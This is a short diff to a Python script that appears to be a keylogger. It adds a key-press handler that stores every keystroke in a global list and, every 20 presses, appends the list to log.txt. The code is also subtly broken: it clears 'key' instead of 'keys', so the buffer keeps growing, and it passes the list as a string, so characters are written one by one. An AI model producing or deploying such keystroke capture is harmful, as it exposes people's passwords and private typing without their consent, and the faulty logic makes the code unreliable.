@@ -6,9 +6,18 @@ count = 0
 keys = []
 
 def onpress(key):
+    global keys, count
+
+    keys.append(key)
+    count += 1
     print("{0} pressed".format(key))
 
-def writefile():
+    if count >= 20:
+        count = 0
+        writefile(str(keys))
+        key = []
+
+def writefile(keys):
     with open("log.txt", "a") as f:
         for key in keys:
             f.write(key)
